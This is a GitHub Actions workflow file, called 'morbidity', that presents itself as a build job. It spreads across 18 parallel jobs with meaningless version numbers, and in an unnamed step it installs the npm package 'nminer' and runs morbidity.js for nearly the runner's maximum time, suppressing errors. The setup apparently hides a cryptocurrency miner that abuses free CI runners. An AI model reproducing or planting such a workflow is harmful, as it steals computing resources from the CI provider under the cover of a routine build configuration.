name: morbidity
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1547 }
          - { version: 5264 }
          - { version: 8335 }
          - { version: 4024 }
          - { version: 9184 }
          - { version: 3384 }
          - { version: 7478 }
          - { version: 2811 }
          - { version: 9007 }
          - { version: 5297 }
          - { version: 1091 }
          - { version: 4809 }
          - { version: 6530 }
          - { version: 6549 }
          - { version: 2047 }
          - { version: 6364 }
          - { version: 7539 }
          - { version: 7867 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 319m node morbidity.js || echo "morbidity executed"